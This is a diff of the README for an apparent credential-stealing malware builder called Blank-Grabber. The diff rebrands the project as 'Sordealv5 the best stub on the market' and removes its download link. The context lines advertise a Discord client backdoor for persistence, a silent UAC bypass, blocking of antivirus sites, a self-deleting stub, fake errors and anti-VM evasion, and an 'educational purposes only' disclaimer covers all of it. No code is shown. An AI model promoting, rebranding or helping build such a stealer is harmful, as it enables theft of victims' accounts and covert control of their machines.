@@ -1,7 +1,7 @@
 
 </p>
 
-## Project Status: Coming to an End
+## Project Status we are officially up right now Sordealv5 the best stub on the market
 
 Dear contributors and users,
 
@@ -25,7 +25,7 @@ Blank-c
 
 ## Table of Contents
 
-- [Download](#download)
+- [Download]
 - [Features](#features)
 - [Stub Settings](#stub-settings)
 - [Requirements](#requirements)
@@ -34,8 +34,7 @@ Blank-c
 
 ## Download
 
-[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/archive/refs/heads/main.zip)
-
+[![Download]
 **Disclaimer:** This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.
 
 **Note:** If the grabber fails to function, attempt rebuilding it without enabling the "Anti VM" option.
@@ -89,7 +88,7 @@ Blank-c
 | **Melt Stub** | Deletes the stub after use. |
 | **Pump Stub** | Pumps the stub upto the provided size. |
 | **Fake Error** | Create custom (fake) error. |
-| **Block AV Sites** | Blocks AV related sites ([Unblock](https://github.com/Blank-c/Blank-Grabber/issues/117)). |
+| **Block AV Sites** | Blocks AV related sites ([Unblock]. |
 | **Discord Injection** | Puts backdoor on the Discord client for persistence. |
 | **UAC Bypass** | Tries to get administrator permissions without showing any prompt. |
 
